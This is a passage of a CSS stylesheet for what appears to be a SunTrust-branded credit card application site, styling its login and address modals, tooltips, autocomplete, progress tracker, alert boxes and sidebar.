    input[type=checkbox], input[type=radio] {
        box-sizing: border-box;
        padding: 0;
    }

    input[type=number]::-webkit-inner-spin-button, input[type=number]::-webkit-outer-spin-button {
        height: auto;
    }

    input[type=search] {
        -webkit-appearance: textfield;
        -moz-box-sizing: content-box;
        -webkit-box-sizing: content-box;
        box-sizing: content-box;
    }

        input[type=search]::-webkit-search-cancel-button, input[type=search]::-webkit-search-decoration {
            -webkit-appearance: none;
        }

fieldset {
    border: 1px solid silver;
    margin: 0 2px;
    padding: .35em .625em .75em;
}

legend {
    border: 0;
    padding: 0;
}

textarea {
    overflow: auto;
}

optgroup {
    font-weight: 700;
}

table {
    border-collapse: collapse;
    border-spacing: 0;
}

td, th {
    padding: 0;
}
/*Addres modal*/
.vertical-alignment-helper {
    display: table;
    height: 100%;
    width: 100%;
}

.AddressModal .modal-dialog {
    display: table-cell;
    vertical-align: middle;
}
.AddressModal .modal-content{
	width:300px;
    height:auto;
    margin: 0 auto;
}
.ie .AddressModal .modal-content{
	width:294px;
    height:auto;
    margin: 0 auto;
}

.AddressModal .modal-body {
    padding: 21px 22px;
}

.btn-back {
    background: #fff;
    border: 1px solid #005EAD;
    color: #005EAD;
    padding: 14px 0px;
    width: 100%;
    font-size: 16px;
    line-height: 20px;
}

.btn-next {
    background: none repeat scroll 0 0 rgb(0, 56, 113);
    color: #fff;
    padding: 14px 0px;
    width: 100%;
    font-size: 16px;
    line-height: 20px;
}

.modal-content h2 {
    font-size: 24px;
    text-align: center;
    padding-bottom: 22px;
    line-height: 27px;
    font-weight:normal;
}

.container-fluid {
    padding: 0px;
}
.address-section{
    padding-left: 10px;
    padding-right: 45px;
    padding-top: 10px;
    padding-bottom: 10px;
    color: #003B71;
    font-size: 15px;
    line-height: 20px;
    text-align: left;
    margin-bottom: 20px;
    border-radius: 4px;
}
    .address-section span {
    color: #333333;
    display: block;
    margin-bottom: 10px;
    font-size: 12px;
    }
.address-section p{
    color: #003B71;
    font-size: 15px;
    line-height: 20px;
    
    text-align: center;
   margin-bottom: 27px;
}
.container-fluid >.button-row {
    padding:0px;
}

.container-fluid > .align-right {
    padding: 0px;
}

.address-label {
    text-align: left;
    font-size: 15px;
    /*height: 97px;*/
    margin-bottom: 25px;
}

.edit-link {
    float: right;
    text-decoration: none !important;
    color: #FFFFFF !important;
    font-size: 15px;
}

.edit-link-img {
    height: 17px;
    float: left;
    padding-top: 3px;
    padding-right: 5px;
}
/*! suntrust-login modal CSS */
.passwordtip {
    position: relative;
    display: inline-block;
}

    .passwordtip .passwordtiptext {
        visibility: visible;
        width: 100px;
        background-color: black;
        color: #fff;
        text-align: center;
        border-radius: 6px;
        padding: 5px 0px;
        position: absolute;
        z-index: 1;
        top: 150%;
        font-size: 14px;
        margin-top: 5px;
    }

        .passwordtip .passwordtiptext::after {
            content: "";
            position: absolute;
            bottom: 100%;
            right: 73%;
            margin-left: -5px;
            border-width: 5px;
            border-style: solid;
            border-color: transparent transparent black transparent;
        }

.LoginModal {
    text-align: center;
}

    .LoginModal .vertical-alignment {
        display: table;
        height: 100%;
        margin: 0 auto;
    }

    .LoginModal .modal-content {
        width: 360px;
        height: auto;
        margin: 0 auto;
    }

    .LoginModal .modal-body {
        padding-left: 39px;
        padding-right: 39px;
        padding-top: 30px;
        padding-bottom: 37px;
    }

    .LoginModal .modal-dialog {
        display: table-cell;
        vertical-align: middle;
    }

.suntrust-login-heading {
    font-size: 36px;
    color: #C94C06 !important;
    font-weight: normal;
    margin-bottom: 13px;
}

.suntrust-login-header {
    padding-top: 40px;
    padding-left: 38px;
    padding-right: 38px;
    padding-bottom: 30px;
    text-align: center;
    border-radius: 4px 4px 0 0;
    margin: 1px;
}

.suntrust-login-heading-sublabel {
    font-size: 20px;
}
/*.LoginModal .toggle-password {
    bottom:40px !important;
}*/
.LoginModal .forgot-password-link {
    text-align: right;
    margin-top: 10px;
    color: #005EAD;
    font-size: 14px;
}

.LoginModal-buttons {
    text-align: center;
}

.modal-spinner-section {
    text-align: center;
    margin-top: 40px;
}

    .modal-spinner-section .loader {
        border: 4px solid rgba(0,0,0,0.15);
        border-radius: 50%;
        border-top: 4px solid #005ead;
        display: inline-block;
        width: 64px;
        height: 64px;
        -webkit-animation: spin 1s linear infinite;
        animation: spin 1s linear infinite;
    }

@-webkit-keyframes spin {
    0% {
        -webkit-transform: rotate(0deg);
    }

    100% {
        -webkit-transform: rotate(360deg);
    }
}

@keyframes spin {
    0% {
        transform: rotate(0deg);
    }

    100% {
        transform: rotate(360deg);
    }
}

.LoginModal .modal-content .form-error {
    margin-top: 0px !important;
    border-radius: 4px 4px 0px 0px;
}

.LoginModal button.disabled {
    transition: background 0.15s ease-in 0s;
}

.BCC-esign .modal-dialog {
    height: 80%;
    display: block;
    width: 72%;
}

.BCC-esign .modal-content {
    height: 100%;
}

.BCC-esign .modal-body {
    height: 95%;
}


/*! Tooltipster CSS */
.tooltipster-default {
    border: 1px solid transparent;
    color: #fff;
    max-width: 300px;
    min-width: 20px;
}

    .tooltipster-default .tooltipster-content {
        font-family: suntrustregular,"Trebuchet MS",sans-serif;
        font-size: 12px;
        line-height: 1.3em;
        padding: 10px 13px;
        overflow: hidden;
    }

.tooltipster-icon {
    cursor: help;
    margin-left: 4px;
}

.tooltipster-base {
    padding: 0;
    font-size: 0;
    line-height: 0;
    position: absolute;
    left: 0;
    top: 0;
    z-index: 9999999;
    pointer-events: none;
    width: auto;
    overflow: visible;
}

    .tooltipster-base .tooltipster-content {
        overflow: hidden;
    }

.tooltipster-arrow {
    display: block;
    text-align: center;
    width: 100%;
    height: 100%;
    position: absolute;
    top: 0;
    left: 0;
    z-index: -1;
}

    .tooltipster-arrow span, .tooltipster-arrow-border {
        display: block;
        width: 0;
        height: 0;
        position: absolute;
    }

.tooltipster-arrow-top span, .tooltipster-arrow-top-left span, .tooltipster-arrow-top-right span {
    border-left: 8px solid transparent !important;
    border-right: 8px solid transparent !important;
    border-top: 8px solid;
    bottom: -7px;
}

.tooltipster-arrow-top .tooltipster-arrow-border, .tooltipster-arrow-top-left .tooltipster-arrow-border, .tooltipster-arrow-top-right .tooltipster-arrow-border {
    border-left: 9px solid transparent !important;
    border-right: 9px solid transparent !important;
    border-top: 9px solid;
    bottom: -7px;
}

.tooltipster-arrow-bottom span, .tooltipster-arrow-bottom-left span, .tooltipster-arrow-bottom-right span {
    border-left: 8px solid transparent !important;
    border-right: 8px solid transparent !important;
    border-bottom: 8px solid;
    top: -7px;
}

.tooltipster-arrow-bottom .tooltipster-arrow-border, .tooltipster-arrow-bottom-left .tooltipster-arrow-border, .tooltipster-arrow-bottom-right .tooltipster-arrow-border {
    border-left: 9px solid transparent !important;
    border-right: 9px solid transparent !important;
    border-bottom: 9px solid;
    top: -7px;
}

.tooltipster-arrow-bottom .tooltipster-arrow-border, .tooltipster-arrow-bottom span, .tooltipster-arrow-top .tooltipster-arrow-border, .tooltipster-arrow-top span {
    left: 0;
    right: 0;
    margin: 0 auto;
}

.tooltipster-arrow-bottom-left span, .tooltipster-arrow-top-left span {
    left: 6px;
}

.tooltipster-arrow-bottom-left .tooltipster-arrow-border, .tooltipster-arrow-top-left .tooltipster-arrow-border {
    left: 5px;
}

.tooltipster-arrow-bottom-right span, .tooltipster-arrow-top-right span {
    right: 6px;
}

.tooltipster-arrow-bottom-right .tooltipster-arrow-border, .tooltipster-arrow-top-right .tooltipster-arrow-border {
    right: 5px;
}

.tooltipster-arrow-left .tooltipster-arrow-border, .tooltipster-arrow-left span {
    border-top: 8px solid transparent !important;
    border-bottom: 8px solid transparent !important;
    border-left: 8px solid;
    top: 50%;
    margin-top: -7px;
    right: -7px;
}

.tooltipster-arrow-left .tooltipster-arrow-border {
    border-top: 9px solid transparent !important;
    border-bottom: 9px solid transparent !important;
    border-left: 9px solid;
    margin-top: -8px;
}

.tooltipster-arrow-right .tooltipster-arrow-border, .tooltipster-arrow-right span {
    border-top: 8px solid transparent !important;
    border-bottom: 8px solid transparent !important;
    border-right: 8px solid;
    top: 50%;
    margin-top: -7px;
    left: -7px;
}

.tooltipster-arrow-right .tooltipster-arrow-border {
    border-top: 9px solid transparent !important;
    border-bottom: 9px solid transparent !important;
    border-right: 9px solid;
    margin-top: -8px;
}

.tooltipster-fade {
    opacity: 0;
    -webkit-transition-property: opacity;
    -moz-transition-property: opacity;
    -o-transition-property: opacity;
    -ms-transition-property: opacity;
    transition-property: opacity;
}

.tooltipster-fade-show {
    opacity: 1;
}

.tooltipster-grow {
    -webkit-transform: scale(0,0);
    -moz-transform: scale(0,0);
    -o-transform: scale(0,0);
    -ms-transform: scale(0,0);
    transform: scale(0,0);
    -webkit-transition-property: -webkit-transform;
    -moz-transition-property: -moz-transform;
    -o-transition-property: -o-transform;
    -ms-transition-property: -ms-transform;
    transition-property: transform;
    -webkit-backface-visibility: hidden;
}

.tooltipster-grow-show {
    -webkit-transform: scale(1,1);
    -moz-transform: scale(1,1);
    -o-transform: scale(1,1);
    -ms-transform: scale(1,1);
    transform: scale(1,1);
    -webkit-transition-timing-function: cubic-bezier(0.175,.885,.32,1);
    -webkit-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    -moz-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    -ms-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    -o-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
}

.tooltipster-swing {
    opacity: 0;
    -webkit-transform: rotateZ(4deg);
    -moz-transform: rotateZ(4deg);
    -o-transform: rotateZ(4deg);
    -ms-transform: rotateZ(4deg);
    transform: rotateZ(4deg);
    -webkit-transition-property: -webkit-transform,opacity;
    -moz-transition-property: -moz-transform;
    -o-transition-property: -o-transform;
    -ms-transition-property: -ms-transform;
    transition-property: transform;
}

.tooltipster-swing-show {
    opacity: 1;
    -webkit-transform: rotateZ(0deg);
    -moz-transform: rotateZ(0deg);
    -o-transform: rotateZ(0deg);
    -ms-transform: rotateZ(0deg);
    transform: rotateZ(0deg);
    -webkit-transition-timing-function: cubic-bezier(0.23,.635,.495,1);
    -webkit-transition-timing-function: cubic-bezier(0.23,.635,.495,2.4);
    -moz-transition-timing-function: cubic-bezier(0.23,.635,.495,2.4);
    -ms-transition-timing-function: cubic-bezier(0.23,.635,.495,2.4);
    -o-transition-timing-function: cubic-bezier(0.23,.635,.495,2.4);
    transition-timing-function: cubic-bezier(0.23,.635,.495,2.4);
}

.tooltipster-fall {
    top: 0;
    -webkit-transition-property: top;
    -moz-transition-property: top;
    -o-transition-property: top;
    -ms-transition-property: top;
    transition-property: top;
    -webkit-transition-timing-function: cubic-bezier(0.175,.885,.32,1);
    -webkit-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    -moz-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    -ms-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    -o-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
}

    .tooltipster-fall.tooltipster-dying {
        -webkit-transition-property: all;
        -moz-transition-property: all;
        -o-transition-property: all;
        -ms-transition-property: all;
        transition-property: all;
        top: 0 !important;
        opacity: 0;
    }

.tooltipster-slide {
    left: -40px;
    -webkit-transition-property: left;
    -moz-transition-property: left;
    -o-transition-property: left;
    -ms-transition-property: left;
    transition-property: left;
    -webkit-transition-timing-function: cubic-bezier(0.175,.885,.32,1);
    -webkit-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    -moz-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    -ms-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    -o-transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
    transition-timing-function: cubic-bezier(0.175,.885,.32,1.15);
}

    .tooltipster-slide.tooltipster-dying {
        -webkit-transition-property: all;
        -moz-transition-property: all;
        -o-transition-property: all;
        -ms-transition-property: all;
        transition-property: all;
        left: 0 !important;
        opacity: 0;
    }

.tooltipster-content-changing {
    opacity: .5;
    -webkit-transform: scale(1.1,1.1);
    -moz-transform: scale(1.1,1.1);
    -o-transform: scale(1.1,1.1);
    -ms-transform: scale(1.1,1.1);
    transform: scale(1.1,1.1);
}

.button-offers {
    display: flex;
    margin-top: -60px;
}

.offers-text {
    margin-top: 10px;
    margin-right: 20px;
}

/* jQuery autocomplete styles */
.autocomplete-suggestions {
    text-align: left;
    cursor: default;
    border: 1px solid #ccc;
    border-top: 0;
    background: #fff;
    box-shadow: -1px 1px 3px rgba(0,0,0,.1);
    /* core styles should not be changed */
    position: absolute;
    display: none;
    z-index: 9999;
    max-height: 254px;
    overflow: hidden;
    overflow-y: auto;
    box-sizing: border-box;
}

.autocomplete-suggestion {
    position: relative;
    padding: 0 .6em;
    line-height: 23px;
    white-space: nowrap;
    overflow: hidden;
    font-size: 1.02em;
    color: #333;
}

    .autocomplete-suggestion b {
        font-weight: normal;
        color: #1f8dd6;
    }

/* jQuery autocomplete custom class for the dropdown "box" (modified z-index for correct layering, added min-width to best capture long entries)  */
.bigify {
    min-width: 60%;
    z-index: 1 !important;
}

/* clearfix NEW */
.clearleft:before,
.clearleft:after,
.clearfix:before,
.clearfix:after {
    content: "";
    display: table;
}

.clearleft:after {
    clear: left;
}

.clearfix:after {
    clear: both;
}

/* clearfix for IE 6/7 (trigger hasLayout) */
.clearfix, clearleft {
    zoom: 1;
}

.clear {
    clear: both;
}

.clear-left {
    clear: left;
}

.clear-right {
    clear: right;
}


/* jumpfix - add this class to any hidden div with margins to prevent "jumping" from jQuery show/hide */
.jumpfix:before,
.jumpfix:after {
    content: "";
    display: table;
    margin: 0;
    padding: 0;
    filter: progid:DXImageTransform.Microsoft.Alpha(Opacity=0);
    opacity: 0;
    visibility: hidden;
}

/* if jumpfix is causing unwanted space add the "nospace" class as well - HACK - */
/* .jumpfix.nospace:before,     (remove the before space for TESTING) */
.jumpfix.nospace:after {
    margin-bottom: -1em;
}


html {
    font-size: 0.66em;
}

body {
    color: rgb(51, 51, 51);
    font-family: "suntrustregular","Trebuchet MS",sans-serif;
    font-size: 1.5rem;
    font-weight: normal;
    line-height: 2rem;
    margin: 0;
    border-top: 0px solid #fff;
}

h1,
h2,
h3,
h4,
h5 {
    margin-top: 0;
    margin-bottom: 0;
}

p {
    margin-top: 0;
    margin-bottom: 20px;
}

ol,
ul {
    padding-left: 18px;
}

ul {
    list-style: disc outside;
}

ol {
    list-style: lower-alpha outside;
}

a, a:link, a:hover, a:visited, a:active {
    text-decoration: none;
    color: #003871;
    /* color: #324fe1; */
    cursor: pointer;
}

    a:hover, a:focus {
        color: #00294d;
        text-decoration: underline;
    }

strong,
b {
    font-weight: bold;
}

em,
i {
    font-style: italic;
}


fieldset {
    margin: 0;
    padding: 0;
    border: 0;
    border-collapse: separate;
    border-spacing: 0;
}

legend {
    border: 0;
    clip: rect(0 0 0 0);
    height: 1px;
    top: -1px;
    overflow: hidden;
    padding: 0;
    position: absolute;
    width: 1px;
}
.product-heading {
    color: #C94C06!important;
    font-size: 32px;
    margin-top: 34px;
    font-weight:normal;
    line-height: 22px;
}
.minus-btn{
    width: 30px;
    height: 30px;
    /*background-color: #E1E8EE;
    border-radius: 6px;*/
    border: none;
    cursor: pointer;
  background: transparent url(../images/minus_icon.svg) 0% 0% no-repeat padding-box;opacity: 1;
  display:block;
  outline:none !important;
}
.minus-btn-disabled {
    width: 30px;
    height: 30px;
    border: none;
    background: transparent url(../images/minus_icon_disabled.svg) 0% 0% no-repeat padding-box;opacity: 1;
    display:block;
    outline:none !important;
}
.plus-btn{
    width: 30px;
    height: 30px;
    /*background-color: #E1E8EE;
    border-radius: 6px;*/
    border: none;
    cursor: pointer;
  background: transparent url(../images/add_icon.svg) 0% 0% no-repeat padding-box;opacity: 1;
  display:block;
  outline:none !important;
   
}
.plus-btn-disabled {
    width: 30px;
    height: 30px;
    border: none;
    background: transparent url(../images/add_icon_disabled.svg) 0% 0% no-repeat padding-box;opacity: 1;
    display:block;
    outline:none !important;   
}
.quantity {
display:flex;
float:right;
}
.cart-input {
height:35px !important;
width:35px !important;
text-align: center;
letter-spacing: 0;
color: #005EAD !important;
font-size:20px !important;
margin-left:15px !important;
margin-right:15px !important;
cursor:default;
}
.cart-input-disabled {
    height:35px !important;
width:35px !important;
text-align: center;
letter-spacing: 0;
cursor:default;
font-size:20px !important;
margin-left:15px !important;
margin-right:15px !important;
color:#CFCFCF !important;
}

.cart-input:focus{
    border: 1px solid rgb(204, 204, 204) !important;
}
.cart-input-disabled:focus{
    border: 1px solid rgb(204, 204, 204) !important;
}
.review-heading {
    color: #C94C06 !important;
    font-size: 30px;
    line-height: 41px;
    font-weight: normal;
    line-height: 22px;
}

.review-note {
    margin-bottom: 40px;
}

.review-ssn {
    font-family: suntrustregular;
    color: #005EAD !important;
    font-size: 15px;
    padding-left: 15px;
    position: absolute;
    top: 40px;
    left: 125px;
}


/* authentication bar specs */

.authentication {
    background: #777;
    z-index: 2;
}

.authentication-container {
    box-sizing: border-box;
    margin: 0 auto;
    max-width: 1000px;
    padding: 2px 10px;
    text-align: right;
}

.authentication ul {
    margin: 0;
    padding: 0;
}

.authentication li {
    display: inline;
    list-style-type: none;
    border-left: 1px solid #aaa;
    padding: 0 10px;
}

    .authentication li:first-child {
        border: 0;
    }

    .authentication li:last-child {
        padding-right: 0;
    }

    .authentication li a:link, .authentication li a:hover, .authentication li a:visited, .authentication li a:active {
        font-size: 1.1rem;
        font-weight: 700;
        color: #fff;
        text-decoration: none;
    }


/* header specs */

header {
    background: none repeat scroll 0 0 rgb(255, 255, 255);
    width: 100%;
    z-index: 2;
}


.header-container {
    box-shadow: none;
    box-sizing: border-box;
    display: table;
    padding: 20px 30px;
    width: 100%;
}

    .header-container .header-logo-container {
        text-align: center;
        max-width: 1000px;
        margin-left: auto;
        margin-right: auto;
    }

        /* 19.7 */
        .header-container .header-logo-container .header-card-benefits {
            position: absolute;
            float: left;
            padding: 20px;
            color: #005EAD;
            cursor: pointer;
            background: #D4E1EF 0% 0% no-repeat padding-box;
            border-radius: 4px;
            opacity: 1;
        }

.arrow {
    background-image: url('../images/Group.png');
    display: inline-block;
    width: 26px;
    height: 18px;
    vertical-align: bottom;
}

.arrow-down {
    transform: rotate(180deg);
}

.card-benefits-content {
    position: absolute;
    z-index: 3;
    background-color: white;
    width: 100%;
}

    .card-benefits-content > div {
        margin-right: auto;
        margin-left: auto;
        max-width: 1000px;
        padding: 20px;
        box-shadow: 0px 3px 6px rgba(0, 0, 0, 0.16);
    }

        .card-benefits-content > div > .card-benefits-header {
            width: 362px;
            height: 27px;
            font-size: 24px;
            color: #EE611F;
        }

        .card-benefits-content > div > .card-benefits-data {
            font-size: 15px;
            color: #333333;
        }

.card-benefits-data > ul > li {
    /*float: left;
    width: 20%;*/
    margin-left: 25px;
}

.card-benefits-data > p {
    padding-top: 20px;
    margin-left: 25px;
    padding-bottom: 20px;
    clear: both;
}

.card-benefits-close {
    color: #005EAD;
    cursor: pointer;
    float: right;
    font-size: 15px;
}

.card-benefits-close-img {
    background: url('../images/Group 723.png') no-repeat;
    height: 7.92px;
    width: 7.92px;
    display: inline-block;
    background-size: cover;
}

.card-benefits-clear {
    clear: both;
}

header .header-logo {
    display: inline-block;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
    background: url(../images/suntrust-logo.svg) no-repeat;
    width: 210px;
    height: 45px;
}

header.shadow .header-container {
    box-shadow: 0 4px 4px rgba(0, 0, 0, 0.06);
    transition: all 0.4s ease 0s;
}

.arrow-downward {
    background-image: url('../images/darkblue-down.svg');
    display: inline-block;
    width: 26px;
    height: 18px;
    vertical-align: bottom;
}

.arrow-down {
    transform: rotate(180deg);
}

/* accessibility specs */
.accessible-text {
    border: 0;
    clip: rect(0 0 0 0);
    height: 1px;
    top: -1px;
    overflow: hidden;
    padding: 0;
    position: absolute;
    width: 1px;
}


.double-spaced {
    margin-top: 2em;
    margin-bottom: 2em;
}

.nowrap {
    white-space: nowrap;
}

/* progress tracker specs */



.progress-tracker {
    list-style: none;
    margin: 0;
    margin-bottom: 10px;
    padding: 0;
    white-space: nowrap;
    display: table;
    width: 100%;
}

    .progress-tracker > .item {
        display: inline-block;
        position: relative;
        padding: 17px 0 17px 34px;
        color: #707070;
        background: #f4f4f4;
        display: table-cell;
    }

        .progress-tracker > .item > .text {
            margin-bottom: 0px;
            margin-top: 0px;
            font-size: 1.3rem;
            font-weight: 700;
            line-height: 1.4rem;
            text-align: center;
            padding-right: 1px; /*testing this */
        }

        .progress-tracker > .item:after {
            content: "";
            border-top: 24px solid transparent;
            border-bottom: 24px solid transparent;
            border-left: 22px solid #f4f4f4;
            position: absolute;
            right: -21px; /* was 22 */
            top: 0;
            z-index: 1;
        }

        .progress-tracker > .item:before {
            content: "";
            position: absolute;
            border-top: 28px solid transparent;
            border-bottom: 28px solid transparent;
            border-left: 25px solid #ffffff;
            left: 0;
            top: -4px;
        }

        .progress-tracker > .item:first-child {
            padding-left: 15px;
            border-top-left-radius: 3px;
            border-bottom-left-radius: 3px;
        }

            .progress-tracker > .item:first-child:before {
                display: none;
            }

        .progress-tracker > .item:last-child {
            padding-right: 15px;
            border-top-right-radius: 3px;
            border-bottom-right-radius: 3px;
        }

            .progress-tracker > .item:last-child:after {
                display: none;
            }

        .progress-tracker > .item.active {
            color: #ba4506; /* --- for ADA compliance -- */
            /* color: #ee6120;  --- old color, noncompliant --- */
            background: #f5ecdd;
        }

            .progress-tracker > .item.active:after {
                border-left-color: #f5ecdd;
            }


/* error/confirmation specs */

.form-inline {
    position: relative;
    top: -20px;
}

.form-error, .page-section-error {
    position: relative;
    background-color: #ffdbdb;
    padding: 20px 20px 20px 60px;
    margin-top: 20px;
}

.page-section-error {
    margin: 0 0 20px 0;
    /*
    color: #ff3300;
    background-color: #ffffff;
    
    ... makes the red box go away ...
    
    */
}

    .form-error:before, .page-section-error:before {
        font-family: "olb-icons";
        display: inline-block;
        font-weight: normal;
        font-style: normal;
        text-decoration: inherit;
        content: "\e003";
        position: absolute;
        top: 20px;
        left: 20px;
        color: #ff3300;
        font-size: 25px;
    }

    .bootstrap .form-error:before, .page-section-error:before {
        content: '';
        background: url("../images/Group 243.svg") no-repeat;
        position: absolute;
        height: 24px;
        width: 24px;
        left: 20px;
        top: 20px;
    }

    .form-error .error-title, .page-section-error .error-title {
        font-weight: bold;
        margin-top: 0;
    }

        .form-error .error-title.no-content, .page-section-error .error-title.nocontent {
            margin: 0;
        }

    .form-error .error-content, .page-section-error .error-content {
        margin-bottom: 0;
    }

.form-success {
    position: relative;
    background-color: #dffde5;
    padding: 20px 20px 20px 60px;
    margin-top: 20px;
}

    .form-success:before {
        font-family: "olb-icons";
        display: inline-block;
        font-weight: normal;
        font-style: normal;
        text-decoration: inherit;
        content: "\e010";
        position: absolute;
        top: 20px;
        left: 20px;
        color: #178817;
        font-size: 25px;
    }

    .form-success .success-title {
        font-weight: bold;
        margin: 0;
    }

    .form-success .success-content {
        margin: 20px 0 0 0;
    }




.form-warning {
    position: relative;
    /* background-color: #f5ecdd;
    background:#FEFFDD; */
    background: #FEFFDD;
    padding: 20px 20px 20px 60px;
    margin-top: 20px;
    border: 0px solid #ee6120;
}

    .form-warning:before {
        font-family: "olb-icons";
        display: inline-block;
        font-weight: normal;
        font-style: normal;
        text-decoration: inherit;
        content: "\e003";
        position: absolute;
        top: 20px;
        left: 20px;
        color: rgb(248, 161, 49);
        font-size: 25px;
        /* font-family: "olb-icons";
	display: inline-block;
	font-weight: bold;
	font-style: normal;
	text-decoration: inherit;
	content: "!";
	position: absolute;
	top: 17px;
	left: 15px;
	font-size: 1.5em;
    color: #fff;
    background: rgb(248, 161, 49);
    border:0px solid #ee6120;
    border-radius:50% 50%;
    padding:.1em .4em; */
    }

    .form-warning .warning-title {
        font-weight: bold;
        margin: 0;
    }

    .form-warning .warning-content {
        margin: 20px 0 0 0;
    }

.warning-note {
    padding: 20px 10px !important;
    background: #f8f1e6;
    border-radius: 4px;
}

.form-lock {
    position: relative;
    /* background-color: #f5ecdd;
    background:#FEFFDD; */
    background: #f5f5f5;
    padding: 20px 20px 20px 60px;
    margin-top: 20px;
    border: 0px solid #ccc;
}

    .form-lock:before {
        color: #ccc;
        position: absolute;
        top: 17px;
        left: 20px;
        font-size: 25px;
        /* border-radius:50% 50%;
    padding:.2em .1em;
    border:1px solid #ccc;
    background:#fff; */
        font-family: "sun-icons";
        display: inline-block;
        font-weight: normal;
        font-style: normal;
        text-decoration: inherit;
        content: "\f10e";
        /* font-family: "olb-icons";
	display: inline-block;
	font-weight: bold;
	font-style: normal;
	text-decoration: inherit;
	content: "!";
	position: absolute;
	top: 17px;
	left: 15px;
	font-size: 1.5em;
    color: #fff;
    background: rgb(248, 161, 49);
    border:0px solid #ee6120;
    border-radius:50% 50%;
    padding:.1em .4em; */
    }

    .form-lock .lock-title {
        font-weight: bold;
        margin: 0;
    }

    .form-lock .lock-content {
        margin: 20px 0 0 0;
    }

.lock-note {
    padding: 20px 10px !important;
    background: #f8f1e6;
    border-radius: 4px;
}


/* content specs */

.boldface {
    font-weight: bold;
}

.nobold {
    font-weight: normal;
}

.main-container {
    background: none repeat scroll 0 0 rgb(255, 255, 255);
    padding-bottom: 60px;
    position: relative;
    /*   padding-top:100px;  TESTING */
}

.main-content {
    margin: 0 auto;
    max-width: 1000px;
    padding: 0 10px;
}

    .main-content.no-progress {
        border-top: 1px solid #eee;
    }

        .main-content.no-progress .progress-tracker-container {
            display: none;
        }

.page {
    width: 675px;
}

h1.page-title {
    margin: 1em 0 .5em 0;
    line-height: 1.2em;
    font-weight: normal;
}

.page h3 {
    color: #333;
}

ul.display li {
    margin: 1em 0;
}

.display-tight li {
    margin: .5em 0;
}

.sidebar {
    float: right;
    width: 275px;
    color: #707070;
}


.sidebar-content {
    margin-top: 1em;
    padding: 10px 10px 100px 30px;
    border-left: 1px solid #eee;
    overflow-y: auto;
    height: 90%;
}

.sidebar-container h3 {
    font-size: 1.7rem;
    color: rgb(13, 54, 90); /* --- blue --- */
    /* color: #ee6120;                --- orange --- */
    margin: 1em 0 1.5em .5em;
    border-bottom: 0px solid #ccc;
}

.sidebar-container ul {
    padding: 0;
    margin: 0 0 3em 1.8em;
    font-size: 1.3rem;
}

.sidebar-container li {
    margin-bottom: .5em;
}

.sidebar-container ul.selections, .sidebar-container ul.status {
    list-style-type: none;
    margin: 0 0 3em .5em;
    font-size: 1.3rem;
}

    .sidebar-container ul.selections li, .sidebar-container ul.status li {
        margin-bottom: 1em;
        overflow: visible;
        padding-left: 42px;
        position: relative;
    }

    .sidebar-container ul.selections.finished {
        margin: 0 0 3em 2.5em;
        font-size: 1.3rem;
    }

        .sidebar-container ul.selections.finished li {
            margin-bottom: 1em;
            overflow: visible;
            padding-left: 15px;
            position: relative;
        }

            .sidebar-container ul.selections.finished li:before {
                color: rgb(23, 136, 23);
                content: "\e010";
                font-family: "olb-icons";
                left: -18px;
                position: absolute;
            }

    .sidebar-container ul.selections li:before {
        left: 10px;
        position: absolute;
        content: "\e010";
        font-family: "olb-icons";
        display: inline-block;
        font-weight: normal;
        font-style: normal;
        text-decoration: inherit;
        padding-right: 1em;
        color: rgb(23, 136, 23); /* --- green --- */
        /* color: rgb(248, 161, 49);        --- orange --- */
    }

    .sidebar-container ul.status li:before {
        left: 9px;
        position: absolute;
        content: "\e027";
        font-family: "olb-icons";
        display: inline-block;
        font-weight: normal;
        font-style: normal;
        text-decoration: inherit;
        padding-right: 1em;
        /* color: rgb(23, 136, 23);        --- green --- */
        /* color: rgb(255, 255, 0);        --- yellow --- */
        /* color: rgb(248, 161, 49);        --- orange --- */
        /* color: rgb(255, 0, 0);          --- red --- */
    }

    .sidebar-container ul.status li.pending:before {
        /* color: rgb(23, 136, 23);        --- green --- */
        /*  color: rgb(255, 255, 0);       --- yellow --- */
        color: rgb(248, 161, 49); /*    --- orange --- */
        /* color: rgb(255, 0, 0);          --- red --- */
    }

    .sidebar-container ul.status li.approved:before {
        color: rgb(23, 136, 23); /*  --- green --- */
        /*  color: rgb(255, 255, 0);       --- yellow --- */
        /*  color: rgb(248, 161, 49);    --- orange --- */
        /* color: rgb(255, 0, 0);          --- red --- */
    }

    .sidebar-container ul.status li.declined:before {
        /*  color: rgb(23, 136, 23);       --- green --- */
        /*  color: rgb(255, 255, 0);       --- yellow --- */
        /*  color: rgb(248, 161, 49);    --- orange --- */
        color: rgb(255, 0, 0); /*  --- red --- */
    }

    .sidebar-container ul.status li.complete:before {
        color: rgb(224, 224, 224);
    }



.sidebar-container ul.questions, .sidebar-container ul.save-retrieve {
    list-style-type: none;
    margin: 0 0 2em .5em;
    font-size: 1.3rem;
}

    .sidebar-container ul.questions a:link, .sidebar ul.questions a:hover, .sidebar ul.questions a:visited, .sidebar ul.questions a:active,
    .sidebar-container ul.save-retrieve a:link, .sidebar ul.save-retrieve a:hover, .sidebar ul.save-retrieve a:visited, .sidebar ul.save-retrieve a:active {
        text-decoration: none;
        color: #707070;
    }

    .sidebar-container ul.save-retrieve a:hover, .sidebar-container ul.save-retrieve a:hover {
        text-decoration: none;
        color: #707070;
    }

    .sidebar-container ul.save-retrieve li, .sidebar-container ul.save-retrieve li {
        margin-bottom: .25em;
    }

div.menu-link {
    display: none;
    cursor: pointer;
}

div.close-link {
    display: none;
    cursor: pointer;
}


    div.close-link:before {
        font-size: 20px;
        font-size: 2rem;
        line-height: 25px;
        line-height: 2.5rem;
        font-family: "olb-icons";
        display: inline-block;
        font-weight: normal;
        font-style: normal;
        text-decoration: inherit;
        content: "\e019";
    }

/* footer-arc specs */

.left-rounded-footer {
